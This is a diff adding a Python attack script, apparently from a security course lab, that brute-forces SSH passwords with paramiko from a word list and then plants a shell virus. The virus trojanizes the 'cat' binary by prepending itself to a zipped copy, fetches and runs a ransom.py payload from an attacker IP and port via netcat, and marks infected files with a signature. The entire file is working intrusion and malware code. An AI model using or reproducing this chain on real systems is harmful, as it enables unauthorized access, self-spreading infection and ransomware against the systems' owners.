@@ -1,0 +1,74 @@
+#!/usr/bin/env python3
+
+import itertools, paramiko, sys
+
+def writeVirus(ip, port):
+    fp = open("virus.sh", "w")
+    fp.write("#!/bin/bash\n")
+    fp.write("signature=`xxd cat | tail -n 1 | awk '{print $3}'`\n")
+    fp.write("if [ \"$signature\" = '1111' ]; then\n")
+    fp.write("  flag=1\n")
+    fp.write("else\n")
+    fp.write("  flag=0\n")
+    fp.write("fi\n")
+    fp.write("ARCHIVE=`awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' $0`\n")
+    fp.write("tail -n+$ARCHIVE $0 | busybox unzip -o -d /tmp - > /dev/null\n")
+    fp.write("netcat " + ip + " " + port + " > ransom.py < /dev/null\n")
+    fp.write("python3 ransom.py ${flag}\n")
+    fp.write("chmod +x /tmp/cat\n")
+    fp.write("/tmp/cat $1\n")
+    fp.write("rm /tmp/cat ransom.py\n")
+    fp.write("truncate -s -6 cat\n")
+    fp.write("echo -n -e '\\x11\\x11\\xde\\xad\\xbe\\xaf' >> cat\n")
+    fp.write("exit 0\n")
+    fp.write("__ARCHIVE_BELOW__\n")
+
+def dictionaryAttack(hostname):
+    f = open('/home/csc2021/materials/victim.dat') 
+    lines = f.read().splitlines()
+
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    for i in range(1, len(lines) + 1):
+        permu = itertools.permutations(lines, i)
+        for fraction in list(permu):
+            password = ''
+            for y in fraction:
+                password += y
+            print(password + " iteration: " + str(i))
+            try:
+                ssh.connect(hostname, 22, "csc2021", password, auth_timeout = 0.5)
+            except Exception:
+                ssh.close()
+                continue
+            injectVirus(ssh)
+            ssh.close()
+            print("success")
+            return
+
+def injectVirus(ssh):
+    t = ssh.get_transport()
+    sftp = paramiko.SFTPClient.from_transport(t)
+    sftp.put('/home/csc2021/virus.sh', '/home/csc2021/virus.sh')
+    stdin, stdout, stderr = ssh.exec_command("stat --printf=\"%s\" cat")
+    originSize = stdout.readlines()
+    stdin, stdout, stderr = ssh.exec_command("zip cat.zip cat")
+    stdout.read() # to force completing exec_command
+    stdin, stdout, stderr = ssh.exec_command("awk '{print}' virus.sh > cat")
+    stdout.read() # to force completing exec_command
+    stdin, stdout, stderr = ssh.exec_command("awk '{print}' cat.zip >> cat")
+    stdout.read() # to force completing exec_command
+    ssh.exec_command("rm cat.zip virus.sh")
+    ssh.exec_command("chmod +x cat")
+    stdin, stdout, stderr =  ssh.exec_command("truncate -s " + str(int(originSize[0]) - 4) + " cat")
+    stdout.read() # to force completing exec_command
+    ssh.exec_command("echo -n -e '\\xde\\xad\\xbe\\xaf' >> cat")
+    stdout.read() # to force completing exec_command
+
+def main():
+    writeVirus(sys.argv[2], sys.argv[3])
+    dictionaryAttack(sys.argv[1])
+
+if __name__ == '__main__':
+	main()
